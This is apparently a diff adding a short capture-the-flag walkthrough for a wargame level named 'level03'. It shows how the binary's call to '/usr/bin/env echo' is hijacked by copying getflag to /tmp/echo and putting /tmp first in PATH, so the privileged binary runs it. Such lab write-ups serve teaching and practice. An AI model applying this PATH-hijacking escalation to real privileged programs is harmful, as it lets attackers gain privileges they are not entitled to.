@@ -1,0 +1,9 @@
+[ Walkthrough ]
+
+There's just a binary called `level03`. If we launch it, we get the output : 'Exploit me'
+We use `strings level03` and can find the line "/usr/bin/env echo Exploit me", so now we know the script uses the `env` command to launch the `echo` command. We'll try to exploit in order to launch the `getflag` command.
+
+First, locate `getflag` : `which getflag` => /bin/getflag
+Copy-paste getflag as echo into /tmp (in which we have write rights) : `cp /bin/getflag /tmp/echo`
+Now let's change the env PATH to /tmp, so the binary will look for the echo command there : export PATH=/tmp:$PATH
+Launch the level03 binary, and retrieve the flag.
